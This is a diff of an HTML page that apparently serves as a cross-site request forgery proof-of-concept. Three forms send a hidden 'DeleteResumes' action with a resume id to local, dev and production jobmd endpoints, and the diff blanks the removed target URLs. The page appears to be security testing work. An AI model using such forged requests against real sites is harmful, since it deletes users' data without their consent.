@@ -9,19 +9,19 @@
 </head>
 <body>
 <h2>测试本地</h2>
-<form action="http://local.jobmd.cn/user/resume.do" method="post">
+<form action="" method="post">
     <input hidden type="text" name="action" value="DeleteResumes">
     <input type="text" name="id" value="2574041">
     <input type="submit" value="attack local">
 </form>
 <h2>测试线下</h2>
-<form action="http://www.jobmd.net/user/resume.do" method="post">
+<form action="" method="post">
     <input hidden type="text" name="action" value="DeleteResumes">
     <input type="text" name="id" value="2574041">
     <input type="submit" value="attack dev">
 </form>
 <h2>测试线上</h2>
-<form action="http://www.jobmd.cn/user/resume.do" method="post">
+<form action="" method="post">
     <input hidden type="text" name="action" value="DeleteResumes">
     <input type="text" name="id" value="2574041">
     <input type="submit" value="attack online">
